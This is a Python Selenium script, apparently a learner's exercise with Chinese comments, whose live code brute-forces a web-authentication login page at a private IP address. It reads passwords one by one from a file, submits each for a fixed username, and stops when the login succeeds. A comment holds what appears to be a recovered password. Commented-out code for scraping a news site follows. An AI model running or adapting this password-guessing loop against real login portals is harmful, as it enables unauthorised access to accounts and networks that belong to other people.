from bs4 import BeautifulSoup
import selenium
from selenium import webdriver
import time

###  安装selenium    pip install selenium
### webdriver 不同的浏览器有不同的驱动 ,需要下载浏览器对应的版本
# response = requests.get('https://www.toutiao.com/')
# print(response.text)
url = 'https://www.toutiao.com/'
url = 'https://www.baidu.com/'
url = 'http://172.16.64.1/WebAuth_auth.asp'

driver = webdriver.Chrome()
driver.get(url)


f = open('../my_util/pwd.txt', 'r')

while True:
    pwd = f.readline()
    if '\n' in pwd:
        pwd = pwd.replace('\n', '')
    # 3pn9tse6
    userName = driver.find_element_by_css_selector('#userName')  # 定位一个元素
    userName.send_keys('python33')  # 与元素发生交互
    userPasswd = driver.find_element_by_css_selector('#userPasswd')

    userPasswd.send_keys(pwd)

    mybtn = driver.find_element_by_css_selector(
        '#content > div > table > tbody > tr > td > form:nth-child(1) > table > tbody > tr:nth-child(8) > td:nth-child(3) > input[type=button]:nth-child(1)')
    mybtn.click()  # 点击登录
    time.sleep(1)
    try:
        tr = driver.find_element_by_css_selector('form table tr')
        print(tr.text)
    except selenium.common.exceptions.NoSuchElementException:
        print('登录成功:', pwd)
        if f:
            f.close()
        break


##  Keys Keys.ENTER 回车
# 保存截图
# time.sleep(5)
# driver.save_screenshot('juyunhui.png')  # phantonJS 无界面浏览器
# myinput.clear()
# driver.back()
# time.sleep(5)
# driver.forward()
# driver.execute_script('window.open()')  # 执行javascript脚本
# driver.switch_to.window(driver.window_handles[1])  # 切换到相应的窗口
# driver.get('https://www.toutiao.com/')
# driver.close()
# driver.switch_to.window(driver.window_handles[0])

# driver.get('https://www.toutiao.com/')
# page = driver.page_source
# print(page)
# soup = BeautifulSoup(page, 'lxml')
# news_zone = soup.find('div', attrs={'class': 'feed-infinite-wrapper'})


# print(news_zone)

# for news in news_list:
#     print(news)
#     title = news.find('a', attrs={'class': 'link'})
#     if title:
#         title = title.get_text()
#     print(title)
#     print('*'*50)
